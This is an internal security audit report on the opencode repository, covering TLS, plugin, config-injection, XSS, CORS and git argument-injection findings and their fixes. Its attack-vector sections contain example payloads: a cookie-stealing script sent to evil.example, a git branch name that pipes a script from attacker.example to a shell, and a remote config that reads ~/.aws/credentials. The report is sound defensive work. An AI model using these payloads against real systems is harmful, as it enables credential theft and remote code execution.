# opencode — Internal Security Audit Report

**Audit date:** 2026-02-23
**Auditor role:** Senior Security Specialist (static analysis)
**Scope:** Full static analysis of the opencode repository
**Commits implementing fixes:** `ac19058dd`, `fb9afd1cd`, `f15a1491c`

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Severity Legend](#2-severity-legend)
3. [Findings — Fixed](#3-findings--fixed)
   - [CRIT-01 — curl Downloads Without TLS Enforcement](#crit-01--curl-downloads-without-tls-enforcement)
   - [HIGH-01 — Third-Party Plugin Installation Without User Warning](#high-01--third-party-plugin-installation-without-user-warning)
   - [HIGH-03 — Remote well-known Config Can Inject Plugins / Permissions](#high-03--remote-well-known-config-can-inject-plugins--permissions)
   - [MED-03 — XSS in OAuth Error Page](#med-03--xss-in-oauth-error-page)
   - [MED-05 — {file:} Interpolation Executes Against Remote Config Sources](#med-05--file-interpolation-executes-against-remote-config-sources)
   - [LOW-02 — Internal Session ID Leaked to External API](#low-02--internal-session-id-leaked-to-external-api)
   - [LOW-03 — CORS Wildcard Allows Any *.opencode.ai Subdomain](#low-03--cors-wildcard-allows-any-opencodeai-subdomain)
   - [LOW-04 — Catch-All Proxy Forwards Sensitive Headers](#low-04--catch-all-proxy-forwards-sensitive-headers)
   - [LOW-05 — Git Commit Message Built via String Interpolation (github/index.ts)](#low-05--git-commit-message-built-via-string-interpolation-githubindexts)
   - [LOW-05b — Same Injection in CLI github Command (missed duplicate)](#low-05b--same-injection-in-cli-github-command-missed-duplicate)
   - [LOW-06 — bun install Output Logged at INFO Level](#low-06--bun-install-output-logged-at-info-level)
   - [LOW-07 — Predictable Temp File Names (TOCTOU)](#low-07--predictable-temp-file-names-toctou)
   - [HIGH-04 — Git Argument Injection via PR Branch Names](#high-04--git-argument-injection-via-pr-branch-names)
4. [Findings — Accepted Risk (Not Fixed)](#4-findings--accepted-risk-not-fixed)
   - [HIGH-02 — Server Unauthenticated by Default](#high-02--server-unauthenticated-by-default)
   - [MED-02 — Full process.env Forwarded to AI Shell / PTY](#med-02--full-processenv-forwarded-to-ai-shell--pty)
   - [MED-04 — OIDC Token Sent to api.opencode.ai](#med-04--oidc-token-sent-to-apiopencodeai)
   - [MED-06 / LOW-01 — Hardcoded Public OAuth Client IDs](#med-06--low-01--hardcoded-public-oauth-client-ids)
5. [False Positives Investigated](#5-false-positives-investigated)
6. [Residual Risk Summary](#6-residual-risk-summary)

---

## 1. Executive Summary

A full static-analysis security audit of the opencode repository identified **18 potential
issues** across all severity levels. **14 were confirmed vulnerabilities**; of those, **14 were
fixed** across three patch commits. Four issues were reviewed, classified as accepted risk due to
architectural constraints, and documented with their rationale below.

A second-pass scan (focused exclusively on critical/high severity) cleared four automated scanner
findings as false positives and uncovered one additional HIGH finding (git argument injection)
that was missed in the first pass. See [Section 5](#5-false-positives-investigated) for the
dismissed findings with rationale.

No dynamic testing, dependency CVE scanning, or penetration testing was performed as part of this
audit. Those activities are recommended as follow-up.

---

## 2. Severity Legend

| Level | Criteria |
|-------|----------|
| **CRITICAL** | Exploitable remotely, no user interaction required; or trivially leads to RCE / data exfiltration |
| **HIGH** | Significant impact; requires limited user interaction or a specific pre-condition |
| **MEDIUM** | Moderate impact; requires attacker control of a non-obvious input channel |
| **LOW** | Limited impact; defense-in-depth improvement or information disclosure |

---

## 3. Findings — Fixed

---

### CRIT-01 — curl Downloads Without TLS Enforcement

| Field | Detail |
|-------|--------|
| **Severity** | CRITICAL |
| **Files** | `packages/opencode/src/installation/index.ts:135` · `install` (bash script) lines 290, 334 |
| **Commit** | `ac19058dd` |

**Description**

The upgrade command in the TypeScript source and both download calls in the root `install` bash
script invoked `curl` without constraining the minimum TLS version or allowed protocols. On a
system with a broken CA store, or under a TLS downgrade attack (forcing TLS 1.0/1.1), the
pipe-to-bash pattern (`curl … | bash`) would execute an untrusted script without the user
receiving any indication of the downgrade.

**Attack vector**

A network attacker (MITM or DNS poisoning) forces a TLS 1.0/1.1 connection. The weakened cipher
suites are decryptable, allowing injection of arbitrary shell commands into the install script
streamed to `bash`.

**Vulnerable code**

```bash
# install (bash script)
curl --trace-ascii "$tracefile" -s -L -o "$output" "$url"
curl -# -L -o "$tmp_dir/$filename" "$url"
```

```typescript
// installation/index.ts
cmd = $`curl -fsSL https://opencode.ai/install | bash`.env({...})
```

**Fix applied**

`--proto '=https' --tlsv1.2` added to all three `curl` invocations. `--proto '=https'` prevents
protocol downgrades to plain HTTP; `--tlsv1.2` sets TLS 1.2 as the minimum acceptable version.

```bash
curl --proto '=https' --tlsv1.2 --trace-ascii "$tracefile" -s -L -o "$output" "$url"
curl --proto '=https' --tlsv1.2 -# -L -o "$tmp_dir/$filename" "$url"
```

```typescript
cmd = $`curl --proto '=https' --tlsv1.2 -fsSL https://opencode.ai/install | bash`.env({...})
```

---

### HIGH-01 — Third-Party Plugin Installation Without User Warning

| Field | Detail |
|-------|--------|
| **Severity** | HIGH |
| **File** | `packages/opencode/src/plugin/index.ts:64` |
| **Commit** | `ac19058dd` |

**Description**

Third-party plugins are fetched from npm and dynamically `import()`-ed with no user-visible
warning at any logging level. A plugin executes with the full process permissions of the opencode
process (filesystem, network, environment variables). A malicious plugin entry in a shared or
enterprise config could silently install and run arbitrary code.

**Attack vector**

An attacker who can influence the opencode config (e.g., via a compromised repo `.opencode/`
directory or a social-engineering PR) adds a malicious package name to the `plugin` array. The
package is installed and executed at next startup with no indication to the user.

**Fix applied**

A `log.warn` message is emitted before `BunProc.install()` for every non-`file://` plugin,
naming the package and version being executed. This ensures the package name is visible in any
non-suppressed log stream.

```typescript
log.warn("installing third-party plugin from npm — this package will run with full process permissions", {
  package: pkg,
  version,
})
```

---

### HIGH-03 — Remote well-known Config Can Inject Plugins / Permissions

| Field | Detail |
|-------|--------|
| **Severity** | HIGH |
| **File** | `packages/opencode/src/config/config.ts:90` |
| **Commit** | `ac19058dd` |

**Description**

When enterprise authentication is configured, opencode fetches a remote config from
`${provider}/.well-known/opencode` and merges it into the full config schema. Because the merge
included all config keys — notably `plugin`, `mcp`, and `permission` — a compromised or
attacker-controlled endpoint (e.g., via DNS hijacking) could inject plugins that run arbitrary
code at process level, register malicious MCP servers, or escalate tool permissions.

**Attack vector**

1. Attacker poisons DNS for the wellknown provider host, or compromises the auth provider.
2. The fabricated `.well-known/opencode` response includes `"plugin": ["malicious-pkg@1.0.0"]`.
3. On next opencode startup, the malicious package is installed from npm and imported.

**Fix applied**

The three sensitive keys are unconditionally deleted from `remoteConfig` before the merge:

```typescript
const remoteConfig = wellknown.config ?? {}
delete remoteConfig.plugin
delete remoteConfig.mcp
delete remoteConfig.permission
```

Remote configs can now only influence non-executable settings (model preferences, system prompts,
etc.), not the plugin/MCP/permission surface.

---

### MED-03 — XSS in OAuth Error Page

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **File** | `packages/opencode/src/plugin/codex.ts:230` |
| **Commit** | `ac19058dd` |

**Description**

The `HTML_ERROR(error: string)` template function directly injected the raw `error` string — taken
from the OAuth callback `?error=` query parameter — into an HTML response body with no escaping.
An attacker who controls the OAuth `error` parameter (e.g., a malicious or misconfigured
authorization server, or an open-redirect on `opencode.ai`) can inject arbitrary HTML and
JavaScript into the page that is rendered in the user's browser.

**Attack vector**

The attacker crafts an authorization URL redirect to:
```
http://localhost:1455/callback?error=<script>fetch('https://evil.example/steal?c='+document.cookie)</script>
```
When the browser is redirected to this URL as part of the OAuth flow, the injected script executes
in the local server's origin context.

**Vulnerable code**

```typescript
<div class="error">${error}</div>
```

**Fix applied**

A `htmlEncode()` helper was added that escapes the five HTML-special characters before the
template is rendered:

```typescript
function htmlEncode(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;")
}

// Applied as:
<div class="error">${htmlEncode(error)}</div>
```

---

### MED-05 — {file:} Interpolation Executes Against Remote Config Sources

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **File** | `packages/opencode/src/config/config.ts:1263` |
| **Commit** | `ac19058dd` |

**Description**

The `{file:path}` token substitution in `load()` was applied to all config sources, including
remote ones. When a remote config (served over HTTP/HTTPS) contains a `{file:~/.ssh/id_rsa}`
token, opencode reads the referenced local file and substitutes its content into the config value.
That value is then forwarded to an LLM, leaking the file's content to a third party.

**Attack vector**

A malicious wellknown endpoint returns:
```json
{ "instructions": "{file:~/.aws/credentials}" }
```
The credentials file is read from disk, embedded in the system prompt, and sent verbatim to the
configured LLM provider's API.

**Fix applied**

The entire `{file:}` block is now guarded by a remote-source check:

```typescript
const isRemoteSource = source.startsWith("http://") || source.startsWith("https://")
if (!isRemoteSource) {
  // ... existing {file:} replacement logic
}
```

`{file:}` tokens in remote configs are silently ignored and left as literal strings.

---

### LOW-02 — Internal Session ID Leaked to External API

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **File** | `packages/opencode/src/plugin/codex.ts:621` |
| **Commit** | `ac19058dd` |

**Description**

The `chat.headers` hook in the Codex plugin unconditionally set
`output.headers.session_id = input.sessionID`, sending the internal opencode session identifier to
the OpenAI/Codex API (`chatgpt.com`) on every request. This is unintentional disclosure of an
internal identifier to a third-party service.

**Impact**

The session ID could be correlated across requests by the API provider, enabling activity profiling
that opencode's own session model was not designed to permit.

**Fix applied**

The line was removed entirely. The Codex API does not document or require this header.

---

### LOW-03 — CORS Wildcard Allows Any *.opencode.ai Subdomain

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **File** | `packages/opencode/src/server/server.ts:121` |
| **Commit** | `ac19058dd` |

**Description**

The CORS `origin()` callback accepted any origin matching the regex
`/^https:\/\/([a-z0-9-]+\.)*opencode\.ai$/`, which permits any subdomain under `opencode.ai`
(e.g., `https://evil.opencode.ai`, `https://cdn.opencode.ai`). If any subdomain is ever
compromised, it gains full CORS access to the local opencode API server.

**Fix applied**

The regex was replaced with an explicit allowlist using a `Set` for O(1) lookup:

```typescript
const TRUSTED_ORIGINS = new Set(["https://app.opencode.ai", "https://opencode.ai"])

// In origin():
if (TRUSTED_ORIGINS.has(input)) return input
```

`TRUSTED_ORIGINS` is declared at module scope to avoid reconstruction on every request.

---

### LOW-04 — Catch-All Proxy Forwards Sensitive Headers

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **File** | `packages/opencode/src/server/server.ts:549` |
| **Commit** | `ac19058dd` |

**Description**

The `.all("/*", ...)` catch-all proxy handler spread `c.req.raw.headers` directly into the
upstream request to `https://app.opencode.ai`. Any `Authorization`, `Cookie`, or `Set-Cookie`
header present in the inbound request was forwarded verbatim to the external host.

**Attack vector**

A page loaded inside the opencode app triggers a cross-origin request with session cookies. Those
cookies are forwarded to `app.opencode.ai`, where they may be valid session credentials,
constituting an unintentional cross-origin cookie relay.

**Fix applied**

A sanitization pass strips the three sensitive header names before forwarding:

```typescript
headers: (() => {
  const h: Record<string, string> = {}
  c.req.raw.headers.forEach((value, key) => {
    const lower = key.toLowerCase()
    if (lower !== "authorization" && lower !== "cookie" && lower !== "set-cookie") {
      h[key] = value
    }
  })
  h["host"] = "app.opencode.ai"
  return h
})(),
```

---

### LOW-05 — Git Commit Message Built via String Interpolation (github/index.ts)

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **File** | `github/index.ts:721–755` (three functions) |
| **Commit** | `ac19058dd` |

**Description**

All three push functions (`pushToNewBranch`, `pushToLocalBranch`, `pushToForkBranch`) in the
GitHub Actions runner script used `git commit -m "${summary}\n\n..."`, interpolating
AI-generated `summary` text directly into the shell command string. A `summary` containing
git trailer tokens, excessive newlines, or shell-significant characters could alter commit
metadata or, in edge cases with certain shell configurations, affect command interpretation.

**Fix applied**

Each occurrence replaced with a write-to-tempfile + `git commit -F` pattern:

```typescript
const msgFile = path.join(tmpdir(), `opencode-commit-${crypto.randomUUID()}.txt`)
await writeFile(msgFile, `${summary}\n\nCo-authored-by: ${actor} <${actor}@users.noreply.github.com>`)
try {
  await $`git commit -F ${msgFile}`
} finally {
  await unlink(msgFile).catch(() => {})
}
```

The file approach passes the message as data rather than a command argument, eliminating all
interpolation risk regardless of message content.

---

### LOW-05b — Same Injection in CLI github Command (missed duplicate)

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **File** | `packages/opencode/src/cli/cmd/github.ts:1120–1150` (three functions) |
| **Commit** | `fb9afd1cd` |

**Description**

`packages/opencode/src/cli/cmd/github.ts` is a parallel implementation of the same GitHub
integration that exists in `github/index.ts`. It contained three identical `git commit -m
"${summary}"` patterns that were missed when LOW-05 was originally patched. Discovered in the
follow-up scan.

**Fix applied**

Identical `-F tempfile` pattern applied to all three functions in this file. Additionally, the
`isSchedule` code path (which previously produced a commit without a co-author) was unified into
the same temp-file flow.

---

### LOW-06 — bun install Output Logged at INFO Level

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **File** | `packages/opencode/src/bun/index.ts:41` |
| **Commit** | `ac19058dd` |

**Description**

`log.info("done", { code, stdout, stderr })` logged the complete `stdout` and `stderr` of every
`bun install` call at INFO level. Package installation output can include authentication tokens,
registry credentials, or API keys echoed from `.npmrc` or `.bunfig.toml`. Any log aggregation
pipeline (Datadog, Splunk, CloudWatch) ingesting INFO-level logs would capture these secrets.

**Fix applied**

Downgraded to `log.debug(...)`. Credentials remain visible for local debugging with `--debug`
or equivalent verbose flag, but are excluded from default production log streams.

---

### LOW-07 — Predictable Temp File Names (TOCTOU)

| Field | Detail |
|-------|--------|
| **Severity** | LOW |
| **File** | `github/index.ts:723,738,755` |
| **Commit** | `fb9afd1cd` |

**Description**

The temp file names introduced in LOW-05 used `Date.now()` (millisecond precision) as the unique
component: `opencode-commit-1708000000000.txt`. On shared CI infrastructure or systems running
multiple concurrent processes, the filename is predictable within a narrow time window. An attacker
with local write access to `tmpdir()` could pre-create a symlink at the predicted path, causing
`writeFile()` to write the commit message through the symlink to an arbitrary location
(symlink-redirect write) or allowing `git commit -F` to read attacker-controlled content
(symlink-redirect read).

**Fix applied**

`Date.now()` replaced with `crypto.randomUUID()` — a cryptographically random 128-bit UUID —
making pre-computation of the filename infeasible:

```typescript
`opencode-commit-${crypto.randomUUID()}.txt`
```

### HIGH-04 — Git Argument Injection via PR Branch Names

| Field | Detail |
|-------|--------|
| **Severity** | HIGH |
| **Files** | `github/index.ts:692,704` · `packages/opencode/src/cli/cmd/github.ts:1085,1097,1086` |
| **Commit** | `f15a1491c` |

**Description**

Both GitHub integration files (`github/index.ts` and `packages/opencode/src/cli/cmd/github.ts`)
called `git fetch` and `git checkout` with PR branch names (`pr.headRefName`) interpolated
directly as the final argument, with no validation that the value does not start with `--`.

Bun's `$` template tag prevents *shell* injection — semicolons, pipes, and backticks in
interpolated values are treated as literal characters. However, Bun's own security documentation
explicitly states it **cannot** prevent *argument injection*: the target program (`git`) receives
the value as a single string and interprets any value beginning with `--` as one of its own flags,
before the shell is involved at all.

**Attack vector**

A fork owner creates a branch named `--upload-pack=curl${IFS}https://attacker.example/s.sh|sh`
(or simpler: `--upload-pack=/path/to/preinstalled/binary`). When the GitHub Action checks out
their PR, git executes:

```
git fetch fork --depth=20 --upload-pack=<attacker-binary>
```

`--upload-pack` is a legitimate git flag that specifies a custom transport subprocess. Git spawns
the named program with full access to the CI runner environment, including `GITHUB_TOKEN`,
`AWS_SECRET_ACCESS_KEY`, repository secrets, and anything else in `process.env`.

Beyond `--upload-pack`, even lower-impact flag injections are possible:
- `--upload-pack` / `--exec` → arbitrary subprocess (RCE)
- `git checkout --orphan` / `--detach` → unintended repository state changes in CI
- `git checkout --no-guess` and similar flags → operational disruption

**Vulnerable code**

```typescript
// github/index.ts (identical pattern in cli/cmd/github.ts)
await $`git fetch origin --depth=${depth} ${branch}`     // branch from pr.headRefName
await $`git checkout ${branch}`                          // branch from pr.headRefName
await $`git fetch fork --depth=${depth} ${remoteBranch}` // remoteBranch from pr.headRefName
```

**Fix applied**

`--` separator added before all PR-supplied branch name arguments in `git fetch` calls. The `--`
is the POSIX-standard end-of-options marker; git stops interpreting subsequent tokens as flags.

For `git checkout`, the command was replaced with `git switch -- <branch>`. This is required
because `git checkout -- x` means "restore file `x` from the index" (pathspec semantics), not
"switch to branch `x`". `git switch` uses `--` unambiguously to mean "what follows is a branch
name".

```typescript
await $`git fetch origin --depth=${depth} -- ${branch}`
await $`git switch -- ${branch}`
await $`git fetch fork --depth=${depth} -- ${remoteBranch}`
```

---

## 4. Findings — Accepted Risk (Not Fixed)

The following issues were identified and reviewed. They are **not fixed** because doing so requires
architectural decisions that are out of scope for targeted security patches, or because the
behavior is correct by design. Each is documented with its rationale and any mitigating controls.

---

### HIGH-02 — Server Unauthenticated by Default

| Field | Detail |
|-------|--------|
| **Severity** | HIGH |
| **File** | `packages/opencode/src/server/server.ts` |
| **Status** | Accepted risk — documented in `security.md` |

**Description**

When server mode is enabled, the HTTP API is unauthenticated by default. Any process with
access to the bound address can call the API.

**Rationale for acceptance**

The server binds to `localhost` only unless explicitly configured otherwise. The project's public
`security.md` explicitly documents that server mode is opt-in and that users are responsible for
securing it via `OPENCODE_SERVER_PASSWORD`. Changing the default would be a breaking change
requiring client-side coordination.

**Mitigating controls**

- Server mode is opt-in (not enabled by default).
- A warning is emitted when the server starts without a password.
- `OPENCODE_SERVER_PASSWORD` environment variable enables HTTP Basic Auth.

---

### MED-02 — Full process.env Forwarded to AI Shell / PTY

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **File** | `packages/opencode/src/tool/bash.ts` and PTY handler |
| **Status** | Accepted risk |

**Description**

The full `process.env` is forwarded to every shell command and PTY session spawned by the AI
agent. This means `AWS_SECRET_ACCESS_KEY`, `SSH_AUTH_SOCK`, `GITHUB_TOKEN`, and similar
credential variables are accessible to any tool call.

**Rationale for acceptance**

Scrubbing specific variables would silently break tools that legitimately depend on them (AWS CLI,
SSH, Git operations). The set of "sensitive" environment variables is workload-specific and cannot
be defined universally. Users requiring isolation should run opencode inside a Docker container or
VM (as recommended in `security.md`).

---

### MED-04 — OIDC Token Sent to api.opencode.ai

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM |
| **File** | `packages/opencode/src/plugin/codex.ts` and auth flow |
| **Status** | Accepted risk — by-design auth exchange |

**Description**

The GitHub OIDC token obtained during GitHub Actions execution is sent to `api.opencode.ai` as
part of the authentication exchange.

**Rationale for acceptance**

This is an intentional server-side token exchange; `api.opencode.ai` validates the OIDC token
with GitHub and returns a scoped access token. Changing this would break GitHub Action integration
entirely and is not a vulnerability in the conventional sense — it is the designed auth flow.

---

### MED-06 / LOW-01 — Hardcoded Public OAuth Client IDs

| Field | Detail |
|-------|--------|
| **Severity** | MEDIUM / LOW |
| **Files** | `packages/opencode/src/plugin/codex.ts`, auth provider configs |
| **Status** | Accepted risk — expected by OAuth spec |

**Description**

OAuth client IDs for GitHub, Anthropic, and OpenAI are hardcoded in the source. They appear in
the public repository.

**Rationale for acceptance**

OAuth 2.0 client IDs for native/SPA applications are **public by design** — the OAuth spec
(RFC 6749 §2.1) explicitly does not require confidentiality for public clients. These values
are not secrets; they identify the application to the authorization server. Rotating them
requires upstream provider coordination and offers no security benefit. The security property is
provided by PKCE (Proof Key for Code Exchange), which is implemented in the Codex plugin.

---

## 5. False Positives Investigated

The following patterns were flagged during automated scanning and investigated but confirmed as
non-issues:

| Pattern | File | Reason |
|---------|------|--------|
| `new Function(trimmed)` | `packages/opencode/src/cli/cmd/debug/agent.ts:99` | Processes a locally-supplied `--params` CLI argument by a developer running the debug command. Not reachable from remote or user input. Intentional JS object literal parser. |
| `` $`realpath ${arg}` `` | `packages/opencode/src/tool/bash.ts:119` | Bun's `$` template tag automatically quotes and escapes all interpolated values. `${arg}` cannot inject shell metacharacters. Confirmed against Bun's published security documentation. |
| `Math.random()` (5 occurrences) | `worktree/index.ts`, `cli/cmd/tui/component/tips.tsx`, `cli/cmd/tui/component/prompt/index.tsx` | All instances select from UI display arrays (tips text, placeholder strings, branch slug adjectives). None are used in security-sensitive contexts (tokens, secrets, IDs). |
| Shell injection via `${branch}` in git commands | `github/index.ts`, `packages/opencode/src/cli/cmd/github.ts` | Bun's `$` tag prevents shell metacharacter interpretation. Raised as shell injection; correctly reclassified as *argument* injection (HIGH-04) and fixed separately. |
| MCP local command execution | `packages/opencode/src/mcp/index.ts:408` | `mcp.command` originates from user-local config files. The project's threat model explicitly excludes malicious local config as an attack vector. Remote injection path already closed by HIGH-03 (plugin/mcp/permission stripped from remote wellknown config). |
| SSRF in wellknown fetch | `packages/opencode/src/config/config.ts:85` | The URL comes from `auth.json` in the user's local data directory. Exploitation requires prior write access to that file — a stronger primitive than the SSRF itself. Not remotely exploitable. |

---

## 6. Residual Risk Summary

| ID | Severity | Description | Status |
|----|----------|-------------|--------|
| CRIT-01 | ~~CRITICAL~~ | curl TLS downgrade on install/upgrade | **Fixed** `ac19058dd` |
| HIGH-01 | ~~HIGH~~ | Silent third-party plugin execution | **Fixed** `ac19058dd` |
| HIGH-02 | HIGH | Server unauthenticated by default | Accepted risk |
| HIGH-03 | ~~HIGH~~ | Remote wellknown config injects plugins | **Fixed** `ac19058dd` |
| HIGH-04 | ~~HIGH~~ | Git argument injection via PR branch names | **Fixed** `f15a1491c` |
| MED-02 | MEDIUM | Full process.env in AI shell/PTY | Accepted risk |
| MED-03 | ~~MEDIUM~~ | XSS in OAuth error page | **Fixed** `ac19058dd` |
| MED-04 | MEDIUM | OIDC token exchange with api.opencode.ai | Accepted risk |
| MED-05 | ~~MEDIUM~~ | {file:} interpolation on remote configs | **Fixed** `ac19058dd` |
| MED-06 | MEDIUM | Hardcoded public OAuth client IDs | Accepted risk |
| LOW-01 | LOW | Hardcoded public OAuth client IDs (secondary) | Accepted risk |
| LOW-02 | ~~LOW~~ | Session ID leaked to Codex API | **Fixed** `ac19058dd` |
| LOW-03 | ~~LOW~~ | CORS wildcard for *.opencode.ai | **Fixed** `ac19058dd` |
| LOW-04 | ~~LOW~~ | Proxy forwards auth/cookie headers | **Fixed** `ac19058dd` |
| LOW-05 | ~~LOW~~ | git commit -m injection (github/index.ts) | **Fixed** `ac19058dd` |
| LOW-05b | ~~LOW~~ | git commit -m injection (cli/cmd/github.ts) | **Fixed** `fb9afd1cd` |
| LOW-06 | ~~LOW~~ | bun install output at INFO log level | **Fixed** `ac19058dd` |
| LOW-07 | ~~LOW~~ | Predictable temp file names (TOCTOU) | **Fixed** `fb9afd1cd` |

**14 of 18 confirmed findings fixed. 4 accepted risks documented with rationale.**

---

*This document reflects the state of the codebase as of commit `f15a1491c` on branch `dev`.*
*Follow-up recommendations: dependency CVE scan (`bun audit`), dynamic testing of the OAuth flow,
and review of MCP server trust boundaries.*
